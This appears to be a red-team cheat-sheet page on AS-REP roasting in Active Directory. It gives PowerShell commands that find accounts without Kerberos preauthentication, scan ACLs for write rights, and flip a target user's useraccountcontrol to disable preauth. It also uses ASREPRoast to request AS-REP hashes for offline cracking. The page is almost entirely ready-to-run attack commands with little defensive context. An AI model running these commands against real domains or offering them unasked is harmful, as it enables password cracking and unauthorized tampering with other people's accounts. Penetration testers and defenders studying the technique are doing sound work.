---
tags: [
	hacking,
	kerberos,
	red-team
]
---

If a user's UserAccountControl settings have `Do Not Require Kerberos preauthentication` enabled it is possible to grab user's crackable AS-REP and brute-force it offline.

With sufficient rights (GenericWrite or GenericAll), Kerberos preauth can be forced disabled as well.

#### Enumeration
```PowerShell
# Using PowerView (dev) 
Get-DomainUser -PreauthNotRequired -Verbose  
```

```PowerShell
# Using ActiveDirectory module:  
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```

```PowerShell
# Enumerate the permissions for RDPUsers on ACLs using PowerView(dev):
Invoke-ACLScanner -ResolveGUIDs |
?{$_.IdentityReferenceName -match "RDPUsers"} 
```

#### Forcing Kerberos pre-auth
```PowerShell
Set-DomainObject -Identity TargetUser5 -XOR @{useraccountcontrol=4194304} –Verbose
```

#### Request encrypted AS-REP for offline brute-force
https://github.com/HarmJ0y/ASREPRoast

```PowerShell
# Using ASREPROAST 
Get-ASREPHash -UserName VPN1user -Verbose  
```

```PowerShell
# To enumerate all users with Kerberos preauth disabled and request a hash  
Invoke-ASREPRoast -Verbose
```
